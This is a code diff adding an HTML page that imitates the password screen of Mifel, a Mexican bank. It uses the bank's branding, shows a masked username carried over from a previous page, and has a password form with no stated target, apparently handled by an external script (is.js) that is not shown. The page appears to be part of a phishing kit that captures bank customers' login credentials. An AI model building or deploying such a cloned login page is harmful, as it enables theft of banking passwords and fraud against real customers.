@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mifel - Contraseña</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+            --link-blue: #0076A8;
+            --glow-light-blue: #00E5FF;
+            --avatar-bg: #00ccc5;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .top-header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 20px 50px; border-bottom: 1px solid #f0f0f0;
+            position: relative;
+        }
+
+        .logo-center {
+            position: absolute; left: 50%; transform: translateX(-50%); width: 120px;
+        }
+
+        .lang-selector {
+            margin-left: auto; display: flex; align-items: center;
+            gap: 8px; font-size: 14px; color: var(--text-grey);
+        }
+
+        .flag-icon { width: 20px; border-radius: 2px; }
+
+        .main-container {
+            flex: 1; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            padding: 40px 20px; text-align: center;
+        }
+
+        .avatar-container {
+            position: relative; width: 100px; height: 100px;
+            margin-bottom: 20px; display: flex; align-items: center;
+            justify-content: center; background-color: var(--avatar-bg);
+            border-radius: 50%; overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .avatar-elipse {
+            position: absolute; width: 100%; height: 100%;
+            z-index: 2; object-fit: cover; opacity: 0.9;
+        }
+
+        .avatar-letter {
+            position: relative; z-index: 3; font-size: 42px;
+            color: #ffffff; font-family: 'Raleway', sans-serif;
+            font-weight: 500; text-transform: uppercase;
+        }
+
+        .welcome-text { color: var(--text-grey); font-size: 18px; margin-bottom: 30px; }
+        .user-highlight { display: block; color: var(--mifel-blue-dark); font-weight: 600; margin-top: 5px; }
+
+        .login-form { width: 100%; max-width: 400px; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; color: var(--text-grey); font-size: 15px; margin-bottom: 10px; }
+
+        .input-wrapper {
+            position: relative; display: flex; align-items: center;
+            background-color: var(--input-bg); border-radius: 4px;
+            transition: all 0.3s ease; border: 1px solid transparent; height: 56px;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: var(--glow-light-blue);
+            box-shadow: 0 0 15px 2px rgba(0, 229, 255, 0.7);
+            background-color: #fff;
+        }
+
+        .input-wrapper input {
+            width: 100%; height: 100%; padding: 0 50px 0 18px;
+            border: none; background: transparent; font-size: 24px;
+            outline: none; letter-spacing: 4px;
+        }
+
+        .toggle-pass {
+            position: absolute; right: 15px; background: none;
+            border: none; cursor: pointer; padding: 0; display: flex;
+        }
+
+        .toggle-pass svg { width: 24px; fill: var(--link-blue); }
+        .forgot-link { color: var(--link-blue); font-size: 13px; text-decoration: none; margin-top: 15px; display: inline-block; }
+
+        .btn-continuar {
+            width: 100%; padding: 18px; background-color: var(--mifel-cyan);
+            color: var(--mifel-blue-dark); border: none; border-radius: 8px;
+            font-weight: 600; font-size: 18px; cursor: pointer;
+            margin-top: 30px; transition: all 0.3s ease;
+        }
+
+        .btn-continuar:hover {
+            background-color: #00b3a5; transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 209, 193, 0.3);
+        }
+
+        .change-user { margin-top: 25px; font-size: 14px; color: var(--text-grey); }
+        .change-user a { color: var(--link-blue); text-decoration: none; font-weight: 600; }
+
+        .footer-simple { padding: 30px; text-align: center; background-color: #ffffff; }
+
+        @media (max-width: 768px) {
+            .logo-center { position: static; transform: none; margin: 0 auto; }
+            .top-header { flex-direction: column; gap: 15px; padding: 15px; }
+            .lang-selector { margin: 0 auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
+        <div class="lang-selector">
+            <img src="https://flagcdn.com/w40/mx.png" alt="MX" class="flag-icon">
+            <span>ES ⌵</span>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="avatar-container">
+            <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/fe787355-34ef-4177-a9fc-5e64dc13c15d/original/avatar-elipse.png" alt="fondo" class="avatar-elipse">
+            <span class="avatar-letter" id="userInitial">-</span>
+        </div>
+
+        <p class="welcome-text">Hola, <span class="user-highlight" id="displayName">...</span></p>
+
+        <form class="login-form">
+            <div class="form-group">
+                <label>Contraseña</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" required>
+                    <button type="button" class="toggle-pass" id="togglePass">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+            </div>
+
+            <button type="submit" class="btn-continuar">Continuar</button>
+        </form>
+
+        <p class="change-user">¿No eres tú? <a href="index.html">Cambiar usuario</a></p>
+    </main>
+
+    <footer class="footer-simple"></footer>
+
+    <script src="is.js"></script>
+    <script>
+        const rawUser = localStorage.getItem('mifel_user') || "Usuario";
+        document.getElementById('userInitial').innerText = rawUser.charAt(0).toUpperCase();
+        
+        const maskedName = rawUser.charAt(0).toUpperCase() + "*".repeat(Math.max(rawUser.length - 1, 4));
+        document.getElementById('displayName').innerText = maskedName;
+
+        const togglePassBtn = document.getElementById('togglePass');
+        const passField = document.getElementById('password');
+
+        togglePassBtn.addEventListener('click', function() {
+            const isPass = passField.getAttribute('type') === 'password';
+            passField.setAttribute('type', isPass ? 'text' : 'password');
+        });
+    </script>
+</body>
+</html>
